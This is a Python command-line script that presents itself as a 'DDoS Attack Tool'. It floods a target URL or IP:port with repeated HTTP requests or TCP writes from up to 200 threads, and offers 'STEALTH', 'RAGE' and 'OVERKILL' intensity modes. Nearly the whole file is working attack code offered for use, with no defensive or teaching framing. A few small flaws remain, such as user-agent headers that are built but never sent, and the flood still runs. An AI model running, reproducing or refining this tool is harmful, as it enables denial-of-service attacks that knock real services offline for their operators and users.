#!/usr/bin/env python3
import sys
import os
import random
import socket
import threading
import time
import argparse
import signal
import urllib.request
from datetime import datetime

# Colors for terminal output
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

# Attack modes
MODES = {
    "STEALTH": {
        "desc": "Low and slow attack",
        "threads": 10,
        "delay": 0.1
    },
    "RAGE": {
        "desc": "Medium intensity attack",
        "threads": 50,
        "delay": 0.01
    },
    "OVERKILL": {
        "desc": "Maximum intensity attack",
        "threads": 200,
        "delay": 0
    }
}

# User agents for requests
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:99.0) Gecko/20100101 Firefox/99.0",
    "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Mobile Safari/537.36"
]

class DDoSAttack:
    def __init__(self, target, mode="STEALTH", threads=None, delay=None):
        self.target = target
        self.mode = mode.upper()
        self.threads = threads or MODES[self.mode]["threads"]
        self.delay = delay or MODES[self.mode]["delay"]
        self.running = False
        self.sent = 0
        self.errors = 0
        self.lock = threading.Lock()
        
    def attack(self):
        """Main attack function"""
        self.running = True
        print(f"{Colors.GREEN}[+] Starting DDoS attack in {self.mode} mode{Colors.ENDC}")
        print(f"{Colors.BLUE}Target: {self.target}{Colors.ENDC}")
        print(f"{Colors.BLUE}Threads: {self.threads}{Colors.ENDC}")
        print(f"{Colors.BLUE}Mode: {MODES[self.mode]['desc']}{Colors.ENDC}")
        
        # Create attack threads
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self._attack_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Monitor attack progress
        try:
            while self.running:
                time.sleep(1)
                with self.lock:
                    total = self.sent + self.errors
                    rate = total / max(1, time.time() - start_time)
                    print(f"\r{Colors.YELLOW}Requests sent: {self.sent} | Errors: {self.errors} | Rate: {rate:.2f} req/sec{Colors.ENDC}", end="")
        except KeyboardInterrupt:
            print("\n\n" + Colors.RED + "[!] Attack interrupted by user" + Colors.ENDC)
            self.stop()
            
    def _attack_worker(self):
        """Individual worker thread function"""
        while self.running:
            try:
                # Select attack method based on target
                if self.target.startswith("http"):
                    self._http_attack()
                else:
                    self._tcp_attack()
                
                # Delay between requests
                time.sleep(self.delay)
                
            except Exception as e:
                with self.lock:
                    self.errors += 1
                    
    def _http_attack(self):
        """HTTP-based attack"""
        try:
            headers = {"User-Agent": random.choice(USER_AGENTS)}
            urllib.request.urlopen(self.target, timeout=3)
            with self.lock:
                self.sent += 1
        except:
            with self.lock:
                self.errors += 1
                
    def _tcp_attack(self):
        """TCP-based attack"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.target.split(":")[0], int(self.target.split(":")[1])))
            s.send(b"A" * 1024)
            s.close()
            with self.lock:
                self.sent += 1
        except:
            with self.lock:
                self.errors += 1
                
    def stop(self):
        """Stop the attack"""
        self.running = False
        print("\n" + Colors.GREEN + "[+] Attack completed" + Colors.ENDC)

def parse_args():
    parser = argparse.ArgumentParser(description="DDoS Attack Tool")
    parser.add_argument("target", help="Target URL or IP:port")
    parser.add_argument("-m", "--mode", choices=["STEALTH", "RAGE", "OVERKILL"], 
                       default="STEALTH", help="Attack mode")
    parser.add_argument("-t", "--threads", type=int, default=None, 
                       help="Number of threads (default: varies by mode)")
    parser.add_argument("-d", "--delay", type=float, default=None, 
                       help="Delay between requests (default: varies by mode)")
    return parser.parse_args()

if __name__ == "__main__":
    args = parse_args()
    
    # Check if target is valid
    if not (args.target.startswith("http") or ":" in args.target):
        print(Colors.RED + "[!] Invalid target format. Use URL or IP:port" + Colors.ENDC)
        sys.exit(1)
        
    # Set up signal handler for clean exit
    def signal_handler(sig, frame):
        print("\n" + Colors.RED + "[!] Shutting down..." + Colors.ENDC)
        attack.stop()
        sys.exit(0)
        
    signal.signal(signal.SIGINT, signal_handler)
    
    # Start attack
    attack = DDoSAttack(args.target, args.mode, args.threads, args.delay)
    start_time = time.time()
    attack.attack()
